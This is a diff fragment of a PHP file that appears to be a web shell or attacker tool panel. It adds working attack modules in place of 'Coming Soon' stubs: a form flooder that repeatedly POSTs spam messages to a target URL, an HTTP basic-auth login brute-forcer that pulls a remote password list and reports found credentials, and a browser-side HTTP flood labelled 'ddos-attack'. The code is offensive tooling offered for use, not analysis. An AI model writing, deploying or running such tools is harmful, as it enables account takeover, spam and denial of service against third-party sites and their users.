 			  </div>";
@@ -2835,14 +2899,14 @@ if(any("z",$_REQUEST))
 							<option value='chr'>Ascii</option>
 							<option value='sha1'>Sha1</option>
 							<option value='crc32'>Crc32</option>
+							<option value='B64E'>B64E</option>
+							<option value='B64D'>B64D</option>
 							<option value='urlencode'>URL Encode</option>
 							<option value='urldecode'>URL Decode</option>
 							<option value='strlen'>String Length</option>
 							<option value='strrev'>String Reverse</option>
 							<option value='base64_encode'>Base64 Encode</option>
 							<option value='base64_decode'>Base64 Decode</option>
-							<option value='B64E'>B64E</option>
-							<option value='B64D'>B64D</option>
 							<option value='entties'>Htmlentities</option>
 							<option value='spechar'>Htmlspecialchars</option>
 						</select>
@@ -3037,24 +3101,254 @@ if(any("z",$_REQUEST))
 			exit;
 		}
 	}
-	if($z=="frmail-bruteforces")
+	if($z=="form-bruteforces")
 	{
-		print "Coming Soon";
+		print "<div class='tools-header'>
+			  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
+			  <h3> by: ".$menu_tools[$z]['auth']."</h3>
+		  </div>";
+
+		$exp='{
+   "name":"Handsome",
+   "email":"very@handsome.com",
+   "subject":"WHOOPS YOU GOT E-MAIL ?!",
+   "message":"HA HA HA HA HA HA HA HA"
+}';
+
+		printf("<div class='form-bruteforces'>
+			<div class='divide-left'>
+				<form onsubmit='return false;' class='new'>
+					<label>Url Action</label><input type='text' id='form-url' placeholder='http://'/><br>
+					<label>Count's</label><input type='number' id='form-count' value='100' min='10' autocomplete='off'/><br>
+					<fieldset>
+						<legend>Parameter (JSON)</legend>
+						<textarea id='form-parameter'>%s</textarea>
+					</fieldset>
+					<input type='submit' onclick=\"return ajaxAbort(true,'form-result')\" value=Cancel />
+					<input type='submit' value='Attack' onclick=\"return getAjax(true,'form-result','POST','?z=form-bruteforces&url='+document.getElementById('form-url').value+'&parameter='+document.getElementById('form-parameter').value+'&count='+document.getElementById('form-count').value);\"/><br>
+				</form>
+			</div>
+			<div class='divide-right'>
+				<fieldset>
+					<legend>Result's</legend>
+					<div id='form-result' class='result'></div>
+				</fieldset>
+			</div>
+		</div>",$exp);
+
+		if(any("url",$_REQUEST)&&any("parameter",$_REQUEST))
+		{
+			ob_clean();
+			$start=$succ=$fail=0;
+			$url=$_REQUEST['url'];
+			$count=$_REQUEST['count'];
+			$parameter=$_REQUEST['parameter'];
+			$content=json_decode($parameter,true);
+			if(!is_array($content))$content=array();
+			do {
+				$start++;
+				$ch=curl_init();
+				curl_setopt($ch,CURLOPT_USERAGENT,$userAgent);
+				curl_setopt($ch,CURLOPT_URL,$url);
+				curl_setopt($ch,CURLOPT_POST,true);
+				curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,10);
+				curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($content));
+				curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+				curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
+				$result=curl_exec($ch);
+				$httpcode=curl_getinfo($ch,CURLINFO_HTTP_CODE); 
+				curl_close($ch);
+				if($httpcode==200)
+				{
+					$succ++;
+				}
+				else
+				{
+					$fail++;
+				}
+				if($start==$count)
+				{
+					echo "Success: $succ<br>Failed: $fail<br>Messages: ".htmlspecialchars($result);
+				}
+			}while($start<=$count);
+			exit;
+		}
 	}
 	if($z=="login-bruteforces")
 	{
-		print "Coming Soon";
+		print "<div class='tools-header'>
+			  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
+			  <h3> by: ".$menu_tools[$z]['auth']."</h3>
+		  </div>";
+
+		printf("<div id='login-bruteforces'>
+			<div class='divide-left'>
+				<form onsubmit='return false;' class='new'>
+					<label>Url Action</label><input type='text' id='login-url' placeholder='http://'/><br>
+					<label>Username</label><input type='text' id='login-username' value='admin'/><br>
+					<label>Pass List</label><input type='text' id='login-passlist' placeholder='http://'/><br>
+					<input type='submit' onclick=\"return getAjax(true,'login-result','POST','?z=login-bruteforces&url='+document.getElementById('login-url').value+'&user='+document.getElementById('login-username').value+'&passlist='+document.getElementById('login-passlist').value);\"/><br>
+				</form>
+			</div>
+			<div class='divide-right'>
+				<fieldset>
+					<legend>Result's</legend>
+					<div id='login-result' class='result'></div>
+				</fieldset>
+			</div>
+		</div>");
+
+		if(any("url",$_REQUEST)&&any("user",$_REQUEST))
+		{
+			ob_clean();
+			ini_set('max_execution_time','600');
+			$url=$_REQUEST['url'];
+			$user=$_REQUEST['user'];
+			$file=GetUrlExists($_REQUEST['passlist']) ? 
+					GetUrlContent($_REQUEST['passlist']) : 
+					$_REQUEST['passlist'];
+			
+			$words=explode("\n",$file);
+			$length=count($words);
+
+			foreach ($words as $index => $word) 
+			{
+				$curl=curl_init($url);
+				$word=strtolower($word);
+				curl_setopt($curl,CURLOPT_USERAGENT,$userAgent);
+				curl_setopt($curl,CURLOPT_HTTPAUTH,CURLAUTH_BASIC);
+				curl_setopt($curl,CURLOPT_USERPWD,"$user:$word");
+				curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);
+				curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,0);
+				curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);
+				$result=curl_exec($curl);
+				$status=curl_getinfo($curl,CURLINFO_HTTP_CODE);
+				curl_close($curl);
+				
+				if(curl_error($curl)) 
+				{
+				    echo curl_error($curl);
+				}
+
+				if ($status==200) 
+				{
+					echo "FOUND'S: $user:$word<br>";
+					exit();
+				}
+
+			}
+			ini_set('max_execution_time','60');
+			exit;
+		}
 	}
 	if($z=="mass-tools")
 	{
+		print "<div class='tools-header'>
+			  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
+			  <h3> by: ".$menu_tools[$z]['auth']."</h3>
+		  </div>";
 		print "Coming Soon";
 	}
 	if($z=="ddos-attack")
 	{
-		print "Coming Soon";
+		print "<div class='tools-header'>
+			  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
+			  <h3> by: ".$menu_tools[$z]['auth']."</h3>
+		  </div>";
+
+		$js=<<< JS
+<script type="text/javascript">
+window.onload=function(){
+
+	var AttackInterval;
+	var xhttp;
+
+	var requestedNode=document.getElementById("requested"),
+        succeededNode=document.getElementById("succeeded"),
+        failedNode=document.getElementById("failed"),
+        targetNode=document.getElementById("target"),
+        attack=document.getElementById("attack"),
+        requestsNode=document.getElementById("requests"),
+        messagesNode=document.getElementById("messages")
+
+	var requested=0,
+        succeeded=0,
+        failed=0;
+
+	var makeHttpRequest=function(){
+		var buff=new ArrayBuffer(512);
+		var bits=new Uint8Array(buff);
+		var xhrx=new XMLHttpRequest();
+		xhrx.open("POST",target=targetNode.value,true);
+		xhrx.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+		xhttp=xhrx;
+		xhrx.onreadystatechange=function(){
+		    if(xhrx.readyState==XMLHttpRequest.DONE){
+		    	if(xhrx.status>=200 && xhrx.status<300){
+			    	onSuccess();
+			    }else{
+			   		onFail();
+			    }
+		   	}
+		   	onRequest();
+		}
+		for(var i=0;i< bits.length;i++){
+			bits[i]=i % 255;
+		}
+		buff['stamp']=messagesNode.value;
+		xhrx.send(buff);
+        };
+
+	var onRequest=function(){
+            requested++;
+            requestedNode.innerHTML=requested;
+	    };
+
+
+	var onFail=function(){
+	    	failed++;
+            failedNode.innerHTML=failed;
+	    };
+
+	var onSuccess=function(){
+            succeeded++;
+            succeededNode.innerHTML=succeeded;
+    	};
+
+	attack.onclick=function(){
+		if(this.value=='Start'){
+			requested=0;
+	        succeeded=0;
+	        failed=0;
+			this.value="Stop";
+			AttackInterval=setInterval(makeHttpRequest,(parseInt(requestsNode.value)));
+		}else if(this.value=='Stop'){
+			this.value="Start";
+			xhttp.abort();
+			clearInterval(AttackInterval);
+		}
+	};
+}
+</script>
+
+<form onsubmit="return false;" class="new">
+	<label>Target</label><input type="text" id="target" value="http://www.target.com"><br>
+	<label>Messages</label><input type="text" id="messages" value="Syn Attack"><br>
+	<label>Interval</label><input type="number" id="requests" value="500" min='500'><br>
+	<label style="margin:10px 0">Requests <span id="requested">0</span> |
+	Succeded <span id="succeeded">0</span> |
+	Failed   <span id="failed">0</span></label><br>
+	<input type="submit" id="attack" value="Start"/>
+</form>
+
+JS;
+
+		printf('%s',$js);		 
+		
+		
 	}
 
-	echo "</div>";
+	print "</div>";
 }
 /* END CUSTOM TOOLZ */
 
